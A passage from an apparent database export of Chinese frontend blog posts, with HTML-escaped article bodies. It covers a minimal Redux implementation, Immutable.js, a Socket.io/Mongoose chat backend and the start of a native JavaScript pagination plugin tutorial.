\u003cspan class=\"hljs-string\"\u003e'increase'\u003c/span\u003e})\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(store.getState()); \u003cspan class=\"hljs-comment\"\u003e// -\u0026gt; 2\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后一步让我们来完成 subscribe 函数， subscribe 函数调用如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003estore.subscribe(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(store.getState())\n)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以 subscribe 函数应该接收一个函数参数，将该函数参数 push 进数组中，并且调用该函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003esubscribe(fn) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subscribers = [...this.subscribers, fn];\n    fn(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.value);\n}\n\u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(initState, reducer) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._state = initState\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._reducer = reducer\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subscribers = []\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e自此，一个简单的 Redux 的内部逻辑就完成了，大家可以运行下代码试试。\u003c/p\u003e\n\u003cp\u003eRedux 中间件的实现我会在课程中讲解，这里就先放下。通过这段分析，我相信大家应该不会对 Redux 还是很迷惑了。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eImmutable.js\u003c/h4\u003e\n\u003cp\u003e我在该项目中使用了该库，具体使用大家可以看项目，这里讲一下这个库到底解决了什么问题。\u003c/p\u003e\n\u003cp\u003e首先 JS 的对象都是引用关系，当然你可以深拷贝一个对象，但是这个操作对于复杂数据结构来说是相当损耗性能的。\u003c/p\u003e\n\u003cp\u003eImmutable 就是解决这个问题而产生的。这个库的数据类型都是不可变的，当你想改变其中的数据时，他会clone 该节点以及它的父节点，所以操作起来是相当高效的。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160ad5cb130a8bb4?w=613\u0026amp;h=575\u0026amp;f=gif\u0026amp;s=319756\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这个库带来的好处是相当大的：\n- 防止了异步安全问题\n- 高性能，并且对于做 React 渲染优化提供了很大帮助\n- 强大的语法糖\n- 时空穿梭 （就是撤销恢复）\u003c/p\u003e\n\u003cp\u003e当然缺点也是有点：\n- 项目倾入性太大 （不推荐老项目使用）\n- 有学习成本\n- 经常忘了重新赋值。。。\u003c/p\u003e\n\u003cp\u003e对于 Immutable.js 的使用也会在视频中讲述\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e性能优化\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e减少不必要的渲染次数\u003c/li\u003e\n\u003cli\u003e使用良好的数据结构\u003c/li\u003e\n\u003cli\u003e数据缓存，使用 Reselect\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e具体该如何实现性能优化，在课程的后期也会讲述\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e聊天相关\u003c/h4\u003e\n\u003cp\u003e在聊天功能中我用了 Socket.io 这个库。该库会在支持的浏览器上使用 Websocket，不支持的会降级使用别的协议。\u003c/p\u003e\n\u003cp\u003eWebsocket 底下使用了 TCP 协议，在生产环境中，对于 TCP 的长链接理论上只需要保证服务端收到消息并且回复一个 ACK 就行。\u003c/p\u003e\n\u003cp\u003e在该项目的聊天数据库结构设计上，我将每个聊天存储为一个 Document，这样后续只需要给这个 Document 的 messages 字段 push 消息就行。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chatSchema = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Schema({\n  \u003cspan class=\"hljs-attr\"\u003emessageId\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eString\u003c/span\u003e,\n  \u003cspan class=\"hljs-comment\"\u003e// 聊天双方\u003c/span\u003e\n  bothSide: [\n    {\n      \u003cspan class=\"hljs-attr\"\u003euser\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: Schema.Types.ObjectId\n      },\n      \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eString\u003c/span\u003e\n      },\n      \u003cspan class=\"hljs-attr\"\u003elastId\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eString\u003c/span\u003e\n      }\n    }\n  ],\n  \u003cspan class=\"hljs-attr\"\u003emessages\u003c/span\u003e: [\n    {\n      \u003cspan class=\"hljs-comment\"\u003e// 发送方\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: Schema.Types.ObjectId,\n        \u003cspan class=\"hljs-attr\"\u003eref\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"user\"\u003c/span\u003e\n      },\n      \u003cspan class=\"hljs-comment\"\u003e// 接收方\u003c/span\u003e\n      to: {\n        \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: Schema.Types.ObjectId,\n        \u003cspan class=\"hljs-attr\"\u003eref\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"user\"\u003c/span\u003e\n      },\n      \u003cspan class=\"hljs-comment\"\u003e// 发送的消息\u003c/span\u003e\n      message: \u003cspan class=\"hljs-built_in\"\u003eString\u003c/span\u003e,\n      \u003cspan class=\"hljs-comment\"\u003e// 发送日期\u003c/span\u003e\n      date: { \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003edefault\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e.now }\n    }\n  ]\n});\n\u003cspan class=\"hljs-comment\"\u003e// 聊天具体后端逻辑\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  io.on(\u003cspan class=\"hljs-string\"\u003e\"connection\"\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eclient\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 将用户存储一起\u003c/span\u003e\n    client.on(\u003cspan class=\"hljs-string\"\u003e\"user\"\u003c/span\u003e, user =\u0026gt; {\n      clients[user] = client.id;\n      client.user = user;\n    });\n    \u003cspan class=\"hljs-comment\"\u003e// 断开连接清除用户信息\u003c/span\u003e\n    client.on(\u003cspan class=\"hljs-string\"\u003e\"disconnect\"\u003c/span\u003e, () =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (client.user) {\n        \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e clients[client.user];\n      }\n    });\n    \u003cspan class=\"hljs-comment\"\u003e// 发送聊天对象昵称\u003c/span\u003e\n    client.on(\u003cspan class=\"hljs-string\"\u003e\"getUserName\"\u003c/span\u003e, id =\u0026gt; {\n      User.findOne({ \u003cspan class=\"hljs-attr\"\u003e_id\u003c/span\u003e: id }, (error, user) =\u0026gt; {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (user) {\n          client.emit(\u003cspan class=\"hljs-string\"\u003e\"userName\"\u003c/span\u003e, user.user);\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n          client.emit(\u003cspan class=\"hljs-string\"\u003e\"serverError\"\u003c/span\u003e, { \u003cspan class=\"hljs-attr\"\u003eerrorMsg\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"找不到该用户\"\u003c/span\u003e });\n        }\n      });\n    });\n    \u003cspan class=\"hljs-comment\"\u003e// 接收信息\u003c/span\u003e\n    client.on(\u003cspan class=\"hljs-string\"\u003e\"sendMessage\"\u003c/span\u003e, data =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e, to, message } = data;\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e messageId = [\u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e, to].sort().join(\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e obj = {\n        \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e,\n        to,\n        message,\n        \u003cspan class=\"hljs-attr\"\u003edate\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eDate\u003c/span\u003e()\n      };\n      \u003cspan class=\"hljs-comment\"\u003e// 异步操作，找到聊天双方\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e.parallel(\n        [\n          \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecallback\u003c/span\u003e) \u003c/span\u003e{\n            User.findOne({ \u003cspan class=\"hljs-attr\"\u003e_id\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e }, (error, user) =\u0026gt; {\n              \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (error || !user) {\n                callback(error, \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e);\n              }\n              callback(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, { \u003cspan class=\"hljs-attr\"\u003efrom\u003c/span\u003e: user.user });\n            });\n          },\n          \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecallback\u003c/span\u003e) \u003c/span\u003e{\n            User.findOne({ \u003cspan class=\"hljs-attr\"\u003e_id\u003c/span\u003e: to }, (error, user) =\u0026gt; {\n              \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (error || !user) {\n                callback(error, \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e);\n              }\n              callback(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, { \u003cspan class=\"hljs-attr\"\u003eto\u003c/span\u003e: user.user });\n            });\n          }\n        ],\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr, results\u003c/span\u003e) \u003c/span\u003e{\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err) {\n            client.emit(\u003cspan class=\"hljs-string\"\u003e\"error\"\u003c/span\u003e, { \u003cspan class=\"hljs-attr\"\u003eerrorMsg\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"找不到聊天对象\"\u003c/span\u003e });\n          } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            \u003cspan class=\"hljs-comment\"\u003e// 寻找该 messageId 是否存在\u003c/span\u003e\n            Chat.findOne({\n              messageId\n            }).exec(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr, doc\u003c/span\u003e) \u003c/span\u003e{\n              \u003cspan class=\"hljs-comment\"\u003e// 不存在就自己创建保存\u003c/span\u003e\n              \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!doc) {\n                \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e chatModel = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Chat({\n                  messageId,\n                  \u003cspan class=\"hljs-attr\"\u003ebothSide\u003c/span\u003e: [\n                    {\n                      \u003cspan class=\"hljs-attr\"\u003euser\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e,\n                      \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: results[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].hasOwnProperty(\u003cspan class=\"hljs-string\"\u003e\"from\"\u003c/span\u003e)\n                        ? results[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].from\n                        : results[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e].from\n                    },\n                    {\n                      \u003cspan class=\"hljs-attr\"\u003euser\u003c/span\u003e: to,\n                      \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: results[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].hasOwnProperty(\u003cspan class=\"hljs-string\"\u003e\"to\"\u003c/span\u003e)\n                        ? results[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].to\n                        : results[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e].to\n                    }\n                  ],\n                  \u003cspan class=\"hljs-attr\"\u003emessages\u003c/span\u003e: [obj]\n                });\n                chatModel.save(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr, chat\u003c/span\u003e) \u003c/span\u003e{\n                  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err || !chat) {\n                    client.emit(\u003cspan class=\"hljs-string\"\u003e\"serverError\"\u003c/span\u003e, { \u003cspan class=\"hljs-attr\"\u003eerrorMsg\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"后端出错\"\u003c/span\u003e });\n                  }\n                  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (clients[to]) {\n                    \u003cspan class=\"hljs-comment\"\u003e// 该 messageId 不存在就得发送发送方昵称\u003c/span\u003e\n                    io.to(clients[to]).emit(\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e, {\n                      \u003cspan class=\"hljs-attr\"\u003eobj\u003c/span\u003e: chat.messages[chat.messages.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e],\n                      \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: results[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].hasOwnProperty(\u003cspan class=\"hljs-string\"\u003e\"from\"\u003c/span\u003e)\n                        ? results[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e].from\n                        : results[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e].from\n                    });\n                  }\n                });\n              } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                doc.messages.push(obj);\n\n                doc.save(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eerr, chat\u003c/span\u003e) \u003c/span\u003e{\n                  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err || !chat) {\n                    client.emit(\u003cspan class=\"hljs-string\"\u003e\"serverError\"\u003c/span\u003e, { \u003cspan class=\"hljs-attr\"\u003eerrorMsg\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"后端出错\"\u003c/span\u003e });\n                  }\n                  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (clients[to]) {\n                    io.to(clients[to]).emit(\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e, {\n                      \u003cspan class=\"hljs-attr\"\u003eobj\u003c/span\u003e: chat.messages[chat.messages.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e]\n                    });\n                  }\n                });\n              }\n            });\n          }\n        }\n      );\n    });\n  });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e课程中的这块功能将会以重点来讲述，并且会单独开一个小视频讲解应用层及传输层必知知识。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e课程相关\u003c/h3\u003e\n\u003cp\u003e视频预计会在 20 小时以上，但是本人毕竟不是专职讲师，还是一线开发者，所以一周只会更新 2 - 3 小时视频，视频会在群内第一时间更新链接。\u003c/p\u003e\n\u003cp\u003e想第一时间获得更新的视频，可以扫码加群。\u003c/p\u003e\n\u003cp\u003e目前几个群都满100人了，如果你想进群可以直接加我好友，我会拉你进一群，\u003cstrong\u003e请备注加群\u003c/strong\u003e，因为加我的实在太多，请耐心等待，当天肯定能进群。当然你也可以 watch 项目，我会在同步更新视频在 Github。\u003c/p\u003e\n\u003cp\u003e进群的小伙伴不如点个赞？让更多的人看到这个文章，这样我就有动力更新视频了。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"我的微信\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160ab8143c23969f?w=361\u0026amp;h=480\u0026amp;f=jpeg\u0026amp;s=57343\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e群内禁止发任何的广告，违者直接踢出。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e本群交流内容不限于前端，对于后端和原生 APP 也可以交流。\u003c/p\u003e\n\u003cp\u003e群内我会每天发一篇前端的优秀文章，每周在双休日发一次总结。群内除了会更新该课程的内容以外，另有别的小教学视频赠送。目前想好的内容包括：前端必知的网络知识和如何写好一篇优秀的简历。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e最后\u003c/h3\u003e\n\u003cp\u003e这是\u003ca target=\"_blank\" href=\"https://github.com/KieSun/Chat-Buy-React\"\u003e项目地址\u003c/a\u003e，觉得不错的可以给我点个 Star。\u003c/p\u003e\n\u003cp\u003e本篇文章也是我 18 年的第一篇博客，祝大家新年快乐，在新的一年学习更多的知识！\u003c/p\u003e\n","buildTime":"1514894896.7712","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3e3"},"id":"5a4ae83551882529c70f7b56","author":{"$oid":"5a4b76338b69bb25d83da3ca"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b49c8c0527749?w=519\u0026h=88\u0026f=gif\u0026s=201622","https://user-gold-cdn.xitu.io/2018/1/2/160b49cc4086b417?w=455\u0026h=102\u0026f=png\u0026s=2520","https://user-gold-cdn.xitu.io/2018/1/2/160b49cf5dc600b8?w=460\u0026h=98\u0026f=png\u0026s=2715","https://user-gold-cdn.xitu.io/2018/1/2/160b49d122b23547?w=459\u0026h=104\u0026f=png\u0026s=2823","https://user-gold-cdn.xitu.io/2018/1/2/160b49d34d3efe3d?w=508\u0026h=116\u0026f=png\u0026s=2967"],"screenShot":null}],"title":"原生 JS实现一个简单分页插件","meta":{"likeCount":0},"tag":["JavaScript","前端"],"comment":[],"shortContent":"最近做的一个 PC端的需求，这个需求中有一个小点，页面底部有一块列表区域，这个列表的数据量比较大，需要进行分页控制，切换页码的时候，发送一个 ajax请求，在页面无刷新的情况下，实现列表数据的刷新，所以就涉及到了前端分页功能，到网上看了一圈，发现那些开源的相关插件要么有各种依赖…","content":"\u003cp\u003e最近做的一个 \u003ccode\u003ePC\u003c/code\u003e端的需求，这个需求中有一个小点，页面底部有一块列表区域，这个列表的数据量比较大，需要进行分页控制，切换页码的时候，发送一个 \u003ccode\u003eajax\u003c/code\u003e请求，在页面无刷新的情况下，实现列表数据的刷新，所以就涉及到了前端分页功能，到网上看了一圈，发现那些开源的相关插件要么有各种依赖，要么太复杂用不上，要么上手有点困难，所以就想着应该也不太难，自己写个得了。\u003c/p\u003e\n\u003cp\u003e关于这种分页功能，平时很常见，不过需要自己动手做的需求却很少，所以一直停留在知道应该就是那么回事，但实际上自己从来没怎么探究过的层面上，知道应该会涉及到一些逻辑判断，不会实现起来应该没什么难度，然而，真的等到自己着手实现的时候，才知道什么叫想得美。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e简单介绍\u003c/h2\u003e\n\u003cp\u003e先上效果图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b49c8c0527749?w=519\u0026amp;h=88\u0026amp;f=gif\u0026amp;s=201622\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e有点类似于 \u003ccode\u003eGithub\u003c/code\u003e搜索结果页的底部分页，可能部分逻辑有点出入，但总体应该差不多\u003c/p\u003e\n\u003cp\u003e代码使用 \u003ccode\u003eES6\u003c/code\u003e语法，这个插件其实是一个 \u003ccode\u003eclass\u003c/code\u003e，\u003ccode\u003ebabel\u003c/code\u003e打包后可兼容到 \u003ccode\u003eIE9\u003c/code\u003e，原生js无任何依赖。\u003c/p\u003e\n\u003cp\u003e整个插件类代码 \u003ccode\u003eSimplePagination\u003c/code\u003e加上空行注释什么的共约 \u003ccode\u003e200\u003c/code\u003e行左右，不过其中有部分代码是辅助代码，例如初始化、选择器、增删类等方法，再除去空行注释，最后剩下的核心代码也就不到 \u003ccode\u003e100\u003c/code\u003e行的样子。\u003c/p\u003e\n\u003cp\u003e主要的判断逻辑都在 \u003ccode\u003egotoPage\u003c/code\u003e这个方法中，因为需要考虑到各种情况，所以里面写了很多的 \u003ccode\u003eif.. else...\u003c/code\u003e判断，没写下这些代码之前，我觉得这个东西充其量也就几个判断差不多了，但是没想到会有这么多，每次的页码切换都对应着不同的判断分支，比较繁琐。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e核心代码简要分析\u003c/h2\u003e\n\u003cp\u003e核心方法是 \u003ccode\u003egotoPage\u003c/code\u003e，乍一看，此方法中到处都是 \u003ccode\u003eif...else..\u003c/code\u003e判断，似乎无从下手，但是不论页码如何变，也不管是如何切换到某个页码的，只需要记住一点，那就是切换到某个页码时，这个页码对应的整个分页组件的状态是\u003cstrong\u003e确定\u003c/strong\u003e的，这一点很重要，只要把握住了这点，那一连串的 \u003ccode\u003eif...else...\u003c/code\u003e判断的意义其实也就清晰了。\u003c/p\u003e\n\u003cp\u003e此方法最外层的一个 \u003ccode\u003eif...else...\u003c/code\u003e判断是针对页码是否需要显示省略号占位符的，如果页码总数小于页面上课同时存在的页码数，那么就不需要省略符号占位了，就是一种比较简单的分页，例如下面这种：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b49cc4086b417?w=455\u0026amp;h=102\u0026amp;f=png\u0026amp;s=2520\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e对于这种情况，只需要在切换页码的时候，变换 \u003ccode\u003eactive\u003c/code\u003e的页码即可。\u003c/p\u003e\n\u003cp\u003e至于另外那种需要省略号占位的情况，才是复杂的地方，而这个分支里，最外层有 \u003ccode\u003e3\u003c/code\u003e个判断，这 \u003ccode\u003e3\u003c/code\u003e个判断包括了所有页码切换的情况。\u003c/p\u003e\n\u003cp\u003e第一个判断是针对分页组件左边不需要出现省略号占位符的情况，例如下面这种：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b49cf5dc600b8?w=460\u0026amp;h=98\u0026amp;f=png\u0026amp;s=2715\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e第二个判断是针对分页组件右边不需要出现省略号占位符的情况，例如下面这种：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b49d122b23547?w=459\u0026amp;h=104\u0026amp;f=png\u0026amp;s=2823\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e第三个判断是针对分页组件两边都需要出现省略号占位符的情况，例如下面这种：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b49d34d3efe3d?w=508\u0026amp;h=116\u0026amp;f=png\u0026amp;s=2967\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e整个分页组件的所有状态，肯定都被包括在这三种状态中，所以接下来的逻辑判断只需要针对这三个状态就行了。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e用法\u003c/h2\u003e\n\u003cp\u003e首先 \u003ccode\u003enew\u003c/code\u003e这个类，然后调用 \u003ccode\u003einit\u003c/code\u003e方法，传入相应的参数即可，例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e slp = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e SimplePagination(\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e)\nslp.init({\n  \u003cspan class=\"hljs-attr\"\u003econtainer\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'.box'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003emaxShowBtnCount\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eonPageChange\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003estate\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'pagination change:'\u003c/span\u003e, state.pageNumber)}\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中，在 \u003ccode\u003enew\u003c/code\u003e实例化 \u003ccode\u003eSimplePagination\u003c/code\u003e类的时候，需要传入 \u003ccode\u003e1\u003c/code\u003e个参数，即总页数(\u003ccode\u003etotalPageCount\u003c/code\u003e)，分页插件需要根据此值来进行页码元素的绘制。\u003c/p\u003e\n\u003cp\u003e调用 \u003ccode\u003einit\u003c/code\u003e方法时，为了方便传参，此方法接收一个对象，对象中存在以下属性：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数名\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e\u003ccode\u003edefault\u003c/code\u003e\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e是否必填\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003econtainer\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ebody\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e一个\u003ccode\u003eDOM\u003c/code\u003e元素的选择器，\u003ccode\u003eid\u003c/code\u003e 或者 \u003ccode\u003eclass\u003c/code\u003e均可，表示分页的容器\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003emaxShowBtnCount\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003enumber\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e5\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e不包括开头和结尾的两个固定按钮外，中间最多展示几个数字页码按钮\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003epCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003epage-li\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e所有的分页页码元素的统一类名，包括上一页、下一页\u003c/td\u003e\n\u003ctd\u003e否\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eactiveCName\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estring\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003epage-active\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e当选中页码时添加的类名\u003ccode\u003eclass\u003c/code\u003e\u003c